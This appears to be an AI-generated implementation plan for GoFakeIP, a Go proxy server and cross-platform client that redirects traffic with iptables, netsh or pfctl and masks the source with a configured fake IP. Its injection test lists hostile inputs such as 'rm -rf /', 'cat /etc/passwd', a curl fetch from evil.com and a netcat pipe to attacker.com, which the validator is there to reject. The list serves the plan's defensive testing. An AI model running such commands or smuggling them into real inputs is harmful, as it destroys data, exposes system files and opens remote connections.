# Implementation Plan: GoFakeIP - Distorting Anonymous Proxy

**Branch**: `001-gofakeip` | **Date**: 2025-10-18 | **Spec**: [spec.md](./spec.md)
**Input**: Feature specification from `/specs/001-gofakeip/spec.md`

## Summary

GoFakeIP is a command-line utility that provides IP address masking through a SOCKS5/HTTP proxy server and cross-platform client configuration tool. The system allows users to redirect local machine traffic through a proxy server that masks the original source IP with a configurable false IP address (Distorting Proxy functionality). The implementation consists of two main components: (1) a high-performance Go-based proxy server that handles SOCKS5 and HTTP connections, and (2) a cross-platform client utility that manages OS-specific network redirection rules on Linux (iptables), Windows (WFP/netsh), and macOS (pfctl).

## Technical Context

**Language/Version**: Go 1.21 or higher
**Primary Dependencies**:
- `golang.org/x/sys` for low-level OS interactions
- Standard library `net`, `net/http` for proxy protocols
- Standard library `os/exec` for system command execution
- [NEEDS CLARIFICATION: Specific SOCKS5 library - build custom or use armon/go-socks5, txthinking/socks5?]
- [NEEDS CLARIFICATION: Configuration management library - viper, flag, or custom?]

**Storage**: File-based configuration (YAML/JSON), no database required
**Testing**: Go's built-in testing framework (`go test`), table-driven tests, integration test suite
**Target Platform**: Cross-platform CLI (Linux amd64/arm64, Windows amd64, macOS amd64/arm64)
**Project Type**: Single CLI application with two binaries (server + client)
**Performance Goals**:
- Handle 1000+ concurrent proxy connections
- Setup/teardown operations complete within 30 seconds
- <100ms latency added by proxy layer

**Constraints**:
- MANDATORY: Explicit privilege checking before system modifications
- MANDATORY: Idempotent setup (no duplicate rules)
- MANDATORY: Fully reversible teardown
- MANDATORY: Input sanitization for all system commands
- No hardcoded credentials or insecure defaults

**Scale/Scope**:
- 2 main binaries (gofakeip-server, gofakeip-client)
- 3 platform-specific implementations (Linux, Windows, macOS)
- ~5000-8000 lines of Go code estimated
- Comprehensive test coverage (>80% for critical paths)

## Constitution Check

*GATE: Must pass before Phase 0 research. Re-check after Phase 1 design.*

### NON-NEGOTIABLE Security Constraints (from CLAUDE.md)

| Constraint | Status | Compliance Plan |
|------------|--------|----------------|
| **1. Least Privilege Enforcement** | ✅ PASS | Client utility will check privileges before attempting system modifications. Platform-specific privilege checks implemented for Unix (getuid) and Windows (token elevation check). |
| **2. Idempotency & Reversibility** | ✅ PASS | Setup will query existing rules before creation. Teardown will enumerate and remove all rules. State tracking to ensure clean restoration. |
| **3. Technology Stack Lock (Go)** | ✅ PASS | All core logic implemented in Go. System calls via exec.Command with validated inputs. No shell script dependencies for core functionality. |
| **4. NO VULNERABLE DEFAULTS** | ✅ PASS | All user inputs validated before system command execution. No hardcoded credentials. Configuration via flags/files only. Parameterized command execution. |

**Gate Decision**: ✅ PROCEED - All constraints are architecturally compatible with the planned implementation.

## Architecture Diagram Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                         User's Machine                           │
│                                                                   │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │              GoFakeIP Client (gofakeip-client)             │ │
│  │                                                             │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │         cmd/gofakeip-client/main.go                  │  │ │
│  │  │  - CLI argument parsing                              │  │ │
│  │  │  - Privilege verification                             │  │ │
│  │  │  - Platform detection                                │  │ │
│  │  └────────────────┬─────────────────────────────────────┘  │ │
│  │                   │                                         │ │
│  │                   ▼                                         │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │      pkg/netconfig (Cross-Platform Abstraction)      │  │ │
│  │  │                                                       │  │ │
│  │  │  interface NetworkConfigurator {                     │  │ │
│  │  │    Setup(proxyAddr) error                            │  │ │
│  │  │    Teardown() error                                  │  │ │
│  │  │    Status() (ConfigState, error)                     │  │ │
│  │  │    CheckPrivileges() error                           │  │ │
│  │  │  }                                                    │  │ │
│  │  └────────────────┬─────────────────────────────────────┘  │ │
│  │                   │                                         │ │
│  │       ┌───────────┼───────────┬───────────────────┐        │ │
│  │       ▼           ▼           ▼                   ▼        │ │
│  │  ┌────────┐  ┌────────┐  ┌─────────┐       ┌──────────┐  │ │
│  │  │ Linux  │  │Windows │  │  macOS  │       │  Input   │  │ │
│  │  │Impl    │  │ Impl   │  │  Impl   │       │Validator │  │ │
│  │  │        │  │        │  │         │       │          │  │ │
│  │  │iptables│  │WFP/    │  │  pfctl  │       │Sanitizer │  │ │
│  │  │wrapper │  │netsh   │  │ wrapper │       │          │  │ │
│  │  └────┬───┘  └───┬────┘  └────┬────┘       └──────────┘  │ │
│  └───────│──────────│──────────────│──────────────────────────┘ │
│          │          │              │                            │
│          ▼          ▼              ▼                            │
│     ┌────────────────────────────────────┐                     │
│     │      OS Network Stack (Kernel)     │                     │
│     │  Netfilter  │   WFP   │     pf     │                     │
│     └────────────────┬───────────────────┘                     │
│                      │                                         │
│            Traffic Redirection via NAT/REDIRECT                │
│                      │                                         │
└──────────────────────┼─────────────────────────────────────────┘
                       │
                       │ Proxied Traffic
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Remote Proxy Server                           │
│                                                                   │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │            GoFakeIP Server (gofakeip-server)               │ │
│  │                                                             │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │         cmd/gofakeip-server/main.go                  │  │ │
│  │  │  - Server initialization                             │  │ │
│  │  │  - Configuration loading (fake IP, listen addr)      │  │ │
│  │  └────────────────┬─────────────────────────────────────┘  │ │
│  │                   │                                         │ │
│  │                   ▼                                         │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │            pkg/proxy (Proxy Core)                    │  │ │
│  │  │                                                       │  │ │
│  │  │  ┌─────────────────┐    ┌──────────────────────┐    │  │ │
│  │  │  │  SOCKS5 Handler │    │  HTTP Proxy Handler  │    │  │ │
│  │  │  │  - Auth (opt)   │    │  - CONNECT method    │    │  │ │
│  │  │  │  - CONNECT cmd  │    │  - GET/POST proxy    │    │  │ │
│  │  │  └────────┬────────┘    └──────────┬───────────┘    │  │ │
│  │  │           │                        │                 │  │ │
│  │  │           └────────────┬───────────┘                 │  │ │
│  │  │                        │                             │  │ │
│  │  │                        ▼                             │  │ │
│  │  │           ┌─────────────────────────┐               │  │ │
│  │  │           │  Connection Pool Mgr    │               │  │ │
│  │  │           │  - Concurrent handling  │               │  │ │
│  │  │           │  - Source IP masking    │               │  │ │
│  │  │           │  - Error handling       │               │  │ │
│  │  │           └──────────┬──────────────┘               │  │ │
│  │  └──────────────────────│──────────────────────────────┘  │ │
│  │                         │                                  │ │
│  │                         ▼                                  │ │
│  │            ┌─────────────────────────┐                     │ │
│  │            │   IP Masking Layer      │                     │ │
│  │            │   (Fake IP injection)   │                     │ │
│  │            └──────────┬──────────────┘                     │ │
│  └───────────────────────┼──────────────────────────────────┘ │
│                          │                                     │
└──────────────────────────┼─────────────────────────────────────┘
                           │
                           │ Outbound connection with FAKE_IP as source
                           │
                           ▼
                  Internet Destination
             (Sees FAKE_IP, not real client IP)
```

## Cross-Platform Strategy Table

| Platform | OS Tool/API | Native Command Examples | Go Implementation Approach | Privilege Check Method | Idempotency Strategy |
|----------|-------------|------------------------|---------------------------|----------------------|---------------------|
| **Linux (Netfilter)** | `iptables` | `iptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-ports 8080` <br> `iptables -t nat -D OUTPUT -p tcp -j REDIRECT --to-ports 8080` | `exec.Command("iptables", "-t", "nat", "-C", ...)` to check existing rules, then `-A` if not present. Use `-D` for teardown. | `os.Getuid() == 0` or check `EUID` environment variable | Query existing rules with `-C` (check) before adding. Store rule identifiers for removal. |
| **Windows (WFP/netsh)** | `netsh advfirewall` or WFP API | `netsh interface portproxy add v4tov4 listenport=80 connectaddress=127.0.0.1 connectport=8080` <br> `netsh interface portproxy delete v4tov4 listenport=80` | `exec.Command("netsh", "interface", "portproxy", "show", "v4tov4")` to query, then add/delete. Consider WFP via `golang.org/x/sys/windows` for more control. | Check token elevation via Windows API (`IsUserAnAdmin()` or token query) | Query existing portproxy rules, compare against target config before creating. Delete by exact match. |
| **macOS (pf)** | `pfctl` | `echo "rdr pass on en0 inet proto tcp to any port 80 -> 127.0.0.1 port 8080" | pfctl -ef -` <br> `pfctl -F all -f /etc/pf.conf` | `exec.Command("pfctl", "-s", "rules")` to check, then load rules via stdin. Use temp rule file or heredoc approach. | `os.Getuid() == 0` for Unix-like privilege check | Load rules into temporary anchor, query anchor before modifying. Use named anchors (e.g., "gofakeip") for clean removal. |

### Implementation Package Structure

```
pkg/netconfig/
├── netconfig.go          # NetworkConfigurator interface definition
├── linux_iptables.go     # Linux implementation using iptables
├── windows_wfp.go        # Windows implementation using netsh/WFP
├── macos_pf.go          # macOS implementation using pfctl
├── validator.go          # Input validation and sanitization
└── privileges.go         # Cross-platform privilege checking

pkg/netconfig/internal/
├── command.go            # Safe command execution wrapper (validation + exec)
└── state.go             # Configuration state tracking
```

### Command Execution Safety Pattern

All platform implementations must use this validated command execution pattern:

```go
// ValidatedCommand ensures no command injection
func ValidatedCommand(name string, args ...string) (*exec.Cmd, error) {
    // 1. Validate command name (whitelist)
    // 2. Validate each argument (no shell metacharacters, length limits)
    // 3. Return exec.Command with validated inputs
}
```

## TDD Blueprint

### Test Suite Structure

```
tests/
├── unit/
│   ├── proxy/
│   │   ├── socks5_handler_test.go
│   │   ├── http_handler_test.go
│   │   ├── connection_pool_test.go
│   │   └── ip_masking_test.go
│   ├── netconfig/
│   │   ├── validator_test.go           # Input validation fuzzing
│   │   ├── privileges_test.go
│   │   └── command_safety_test.go
│   └── client/
│       └── cli_parsing_test.go
│
├── integration/
│   ├── proxy_e2e_test.go               # Full proxy flow tests
│   ├── client_setup_teardown_test.go   # Idempotency & reversibility
│   └── cross_platform_test.go          # Platform-specific integration
│
├── security/
│   ├── privilege_enforcement_test.go   # MANDATORY: FR-010, FR-011
│   ├── input_injection_test.go         # MANDATORY: FR-020, FR-023
│   ├── no_hardcoded_secrets_test.go    # MANDATORY: FR-021
│   └── idempotency_test.go            # MANDATORY: FR-014
│
└── reversibility/
    ├── linux_teardown_test.go          # MANDATORY: FR-015
    ├── windows_teardown_test.go        # MANDATORY: FR-015
    └── macos_teardown_test.go          # MANDATORY: FR-015
```

### Mandatory Security & Reversibility Tests

#### 1. Privilege Enforcement Tests (NON-NEGOTIABLE #1)

```go
// Test: Client refuses to run without privileges
func TestSetupRefusesWithoutPrivileges(t *testing.T) {
    // Given: User runs setup without sudo/admin
    // When: Client attempts setup
    // Then: Returns error, makes zero system modifications
}

// Test: Privilege check occurs before any system call
func TestPrivilegeCheckPrecedesAllSystemCalls(t *testing.T) {
    // Given: Mock system with privilege check instrumentation
    // When: Setup is called
    // Then: Verify privilege check is first operation
}
```

#### 2. Idempotency Tests (NON-NEGOTIABLE #2)

```go
// Test: Running setup twice creates same state as once
func TestSetupIdempotency(t *testing.T) {
    // Given: Clean system
    // When: Run setup(), capture state, run setup() again
    // Then: State after 1st run == State after 2nd run (no duplicate rules)
}

// Test: Setup detects existing rules
func TestSetupDetectsExistingConfiguration(t *testing.T) {
    // Given: System with manually created similar rules
    // When: Run setup()
    // Then: Existing rules preserved or merged, no conflicts
}
```

#### 3. Reversibility Tests (NON-NEGOTIABLE #2)

```go
// Test: Teardown fully restores original state
func TestTeardownFullRestore(t *testing.T) {
    // Given: Capture baseline network state
    // When: Run setup(), then teardown()
    // Then: Final state == Baseline state (100% restoration)
}

// Test: Teardown succeeds when run multiple times
func TestTeardownMultipleExecutions(t *testing.T) {
    // Given: System with active configuration
    // When: Run teardown() 3 times consecutively
    // Then: All executions succeed, no errors
}

// Test: Teardown succeeds on clean system
func TestTeardownOnCleanSystem(t *testing.T) {
    // Given: System with no GoFakeIP rules
    // When: Run teardown()
    // Then: Success (graceful handling)
}
```

#### 4. Input Validation Fuzzing Tests (NON-NEGOTIABLE #4)

```go
// Test: Command injection prevention
func TestCommandInjectionPrevention(t *testing.T) {
    maliciousInputs := []string{
        "; rm -rf /",
        "127.0.0.1 && cat /etc/passwd",
        "$(curl evil.com/script.sh)",
        "`reboot`",
        "| nc attacker.com 1234",
    }
    // For each malicious input:
    // When: Passed to validator
    // Then: Rejected before reaching exec.Command
}

// Test: Proxy address validation
func TestProxyAddressValidation(t *testing.T) {
    // Given: Various invalid addresses (overflow, malformed, injections)
    // When: Validator processes them
    // Then: All rejected with specific errors
}
```

#### 5. No Hardcoded Secrets Test (NON-NEGOTIABLE #4)

```go
// Test: Source code contains no hardcoded credentials
func TestNoHardcodedSecrets(t *testing.T) {
    // Given: All .go files in project
    // When: Scan for patterns (API keys, passwords, tokens)
    // Then: Zero matches for secret patterns
}
```

### Test Execution Strategy

1. **Unit Tests**: Run on every commit (fast, isolated)
2. **Integration Tests**: Run on PR creation (requires test environments)
3. **Security Tests**: Run on every commit (gate for merge)
4. **Reversibility Tests**: Run on platform-specific runners (Linux/Windows/macOS CI)
5. **Fuzzing Tests**: Continuous fuzzing in CI for input validators

### Coverage Requirements

- **Security-critical code**: 100% coverage (privilege checks, input validation)
- **Core proxy logic**: >90% coverage
- **Platform-specific implementations**: >85% coverage per platform
- **CLI and utilities**: >70% coverage

## Project Structure

### Documentation (this feature)

```
specs/001-gofakeip/
├── plan.md              # This file (/speckit.plan command output)
├── research.md          # Phase 0 output (dependency decisions, library choices)
├── data-model.md        # Phase 1 output (entities, state models)
├── quickstart.md        # Phase 1 output (setup and usage guide)
├── contracts/           # Phase 1 output (API specs, if applicable)
└── tasks.md             # Phase 2 output (/speckit.tasks command - NOT created by /speckit.plan)
```

### Source Code (repository root)

```
cmd/
├── gofakeip-server/
│   └── main.go          # Proxy server entry point
└── gofakeip-client/
    └── main.go          # Client utility entry point

pkg/
├── proxy/
│   ├── socks5.go        # SOCKS5 protocol handler
│   ├── http.go          # HTTP proxy handler
│   ├── pool.go          # Connection pool management
│   └── masking.go       # IP masking logic
│
├── netconfig/
│   ├── netconfig.go     # NetworkConfigurator interface
│   ├── linux_iptables.go
│   ├── windows_wfp.go
│   ├── macos_pf.go
│   ├── validator.go     # Input sanitization
│   ├── privileges.go    # Privilege checking
│   └── internal/
│       ├── command.go   # Safe command execution
│       └── state.go     # State tracking
│
├── config/
│   ├── server.go        # Server configuration
│   └── client.go        # Client configuration
│
└── common/
    ├── errors.go        # Error definitions
    └── logging.go       # Logging utilities

tests/
├── unit/                # Unit tests (mirrors pkg/ structure)
├── integration/         # E2E integration tests
├── security/            # Security constraint validation tests
└── reversibility/       # Platform-specific teardown tests

docs/
├── architecture.md      # System architecture details
├── security.md          # Security model and constraints
└── development.md       # Development workflow
```

**Structure Decision**: Single project structure with two binaries (server and client). Both share the `pkg/` libraries for common functionality (config, logging, errors). The `pkg/netconfig` provides cross-platform abstraction with platform-specific implementations using build tags (`//go:build linux`, etc.). This structure allows independent development and testing of each component while sharing validated, security-compliant common code.

## Complexity Tracking

*No complexity violations identified. Project follows standard Go patterns and respects all NON-NEGOTIABLE constraints.*

---

## Phase 0: Research & Clarifications

**Status**: PENDING - Requires research agent execution

### Research Tasks

1. **SOCKS5 Library Selection**
   - **Question**: Build custom SOCKS5 implementation or use existing library (armon/go-socks5, txthinking/socks5)?
   - **Research Goals**:
     - Evaluate security track record of candidate libraries
     - Assess IP masking compatibility (can we inject fake source IP?)
     - Performance benchmarks (concurrent connections)
   - **Decision Criteria**: Security > Customizability > Performance

2. **Configuration Management**
   - **Question**: Use viper, standard flag package, or custom config parser?
   - **Research Goals**:
     - Evaluate security of config parsing (injection risks)
     - Assess YAML vs JSON vs TOML suitability
     - Determine if environment variable support needed
   - **Decision Criteria**: Security (no eval/exec) > Simplicity > Features

3. **Windows Network Configuration Best Practices**
   - **Question**: Use netsh (simpler) or WFP API via golang.org/x/sys/windows (more control)?
   - **Research Goals**:
     - netsh portproxy limitations for our use case
     - WFP programming complexity and maintenance burden
     - Windows version compatibility (Windows 10+)
   - **Decision Criteria**: Reliability > Maintainability > Feature completeness

4. **IP Masking Implementation Strategy**
   - **Question**: How to reliably inject fake source IP at network layer?
   - **Research Goals**:
     - Understand limitations of user-space IP spoofing
     - Investigate if kernel modules required
     - Research NAT-based approaches vs raw socket approaches
   - **Decision Criteria**: Feasibility > User-space only > Portability

**Expected Output**: `research.md` with all decisions documented and NEEDS CLARIFICATION markers resolved.

---

## Phase 1: Design Artifacts

**Status**: PENDING - Blocked on Phase 0 completion

### Deliverables

1. **data-model.md**: Entity definitions for:
   - ProxyConfig (server configuration including fake IP)
   - ClientConfig (client settings, proxy address)
   - NetworkRule (abstract rule representation)
   - ConnectionState (active proxy connections)

2. **contracts/** (if applicable):
   - CLI command specifications (server + client)
   - Configuration file schema (JSON/YAML)
   - Inter-process communication (if server/client communicate)

3. **quickstart.md**:
   - Installation instructions
   - Basic server setup example
   - Client configuration walkthrough (per platform)
   - Teardown procedure
   - Troubleshooting common issues

4. **Agent context update**:
   - Run `.specify/scripts/powershell/update-agent-context.ps1 -AgentType claude`
   - Update with Go libraries decided in Phase 0
   - Document security patterns (validated command execution)

**Expected Output**: Complete design artifacts ready for task decomposition.

---

## Next Steps

1. ✅ **Constitution Check**: PASSED - Proceed to Phase 0
2. ⏳ **Phase 0**: Execute research tasks, generate `research.md`
3. ⏳ **Phase 1**: Generate design artifacts (data-model.md, contracts/, quickstart.md)
4. ⏳ **Constitution Re-Check**: Verify design compliance
5. ⏳ **Phase 2**: Run `/speckit.tasks` to generate task decomposition

**Command Status**: `/speckit.plan` completes here. Run `/speckit.tasks` after Phase 1 artifacts are generated.
